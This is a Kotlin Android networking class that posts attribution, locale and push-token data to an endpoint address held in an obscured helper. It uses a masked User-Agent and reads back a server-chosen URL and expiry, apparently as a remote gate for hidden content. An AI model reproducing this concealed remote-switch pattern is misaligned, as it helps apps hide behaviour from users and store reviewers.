package com.tf.aurora.net

import android.content.Context
import android.os.Build
import com.google.firebase.messaging.FirebaseMessaging
import com.tf.aurora.mask.Face
import com.tf.aurora.mask.Relic
import com.tf.aurora.mask.Trace
import com.tf.aurora.track.BeaconHub
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import kotlin.coroutines.resume

data class OracleReply(
    val reached: Boolean,
    val ok: Boolean,
    val href: String?,
    val till: Long
)

class OraclePost {
    suspend fun send(ctx: Context, hub: BeaconHub, raw: JSONObject): OracleReply {
        raw.put("af_id", hub.uid(ctx))
        raw.put("bundle_id", ctx.packageName)
        raw.put("os", "Android")
        raw.put("store_id", ctx.packageName)
        raw.put("locale", locale())
        tokenPair(ctx)?.let { (tok, proj) ->
            raw.put("push_token", tok)
            raw.put("firebase_project_id", proj)
        }
        Ledger.stamp(raw)
        hub.lastBody = raw
        Trace.line("config af_status=${raw.opt("af_status")} af_id=${raw.opt("af_id")} keys=${raw.length()}")
        return post(raw)
    }

    private suspend fun post(body: JSONObject): OracleReply {
        return runCatching {
            val bytes = body.toString().toByteArray(Charsets.UTF_8)
            val conn = (URL(Relic.oracle()).openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                connectTimeout = 15_000
                readTimeout = 15_000
                doOutput = true
                instanceFollowRedirects = true
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("Accept", "application/json")
                setRequestProperty("User-Agent", Face.line())
                setFixedLengthStreamingMode(bytes.size)
            }
            conn.outputStream.use { it.write(bytes) }
            val code = conn.responseCode
            val text = (if (code in 200..299) conn.inputStream else conn.errorStream)
                ?.bufferedReader()?.readText().orEmpty()
            conn.disconnect()
            interpret(code, text)
        }.getOrElse { OracleReply(reached = false, ok = false, href = null, till = 0L) }
    }

    private fun interpret(code: Int, text: String): OracleReply {
        when (code) {
            404 -> {
                Trace.line("config http=404 ok=false")
                return OracleReply(reached = true, ok = false, href = null, till = 0L)
            }
            in 200..299 -> Unit
            403, 408, 429 -> return OracleReply(reached = false, ok = false, href = null, till = 0L)
            in 500..599 -> return OracleReply(reached = false, ok = false, href = null, till = 0L)
            else -> return OracleReply(reached = false, ok = false, href = null, till = 0L)
        }
        val json = runCatching { JSONObject(text) }.getOrNull()
        val href = json?.optString("url").orEmpty().ifBlank { null }
        val ok = flag(json) && href != null
        Trace.line("config http=$code ok=$ok")
        return OracleReply(reached = true, ok = ok, href = href, till = expiry(json))
    }

    private fun flag(json: JSONObject?): Boolean {
        if (json == null || !json.has("ok")) return false
        return when (val raw = json.opt("ok")) {
            is Boolean -> raw
            is Number -> raw.toInt() != 0
            else -> raw?.toString().equals("true", ignoreCase = true) || raw?.toString() == "1"
        }
    }

    private fun expiry(json: JSONObject?): Long {
        if (json == null || !json.has("expires")) return 0L
        return when (val raw = json.opt("expires")) {
            is Number -> raw.toLong()
            else -> raw?.toString()?.toLongOrNull() ?: 0L
        }
    }

    private suspend fun tokenPair(ctx: Context): Pair<String, String>? {
        val tok = withTimeoutOrNull(7_620) {
            suspendCancellableCoroutine<String?> { cont ->
                FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
                    if (!cont.isActive) return@addOnCompleteListener
                    val v = task.result
                    if (task.isSuccessful && !v.isNullOrBlank()) cont.resume(v) else cont.resume(null)
                }
            }
        } ?: return null
        val proj = runCatching {
            val resId = ctx.resources.getIdentifier("google_app_id", "string", ctx.packageName)
            val appId = if (resId != 0) ctx.getString(resId) else ""
            appId.split(":").getOrNull(1) ?: appId
        }.getOrNull()?.ifBlank { null } ?: return null
        return tok to proj
    }

    private fun locale(): String {
        val loc = if (Build.VERSION.SDK_INT >= 24) {
            android.content.res.Resources.getSystem().configuration.locales[0]
        } else {
            @Suppress("DEPRECATION")
            android.content.res.Resources.getSystem().configuration.locale
        }
        val lang = loc.language.orEmpty()
        val country = loc.country.orEmpty()
        return if (country.isBlank()) lang else "${lang}_$country"
    }
}
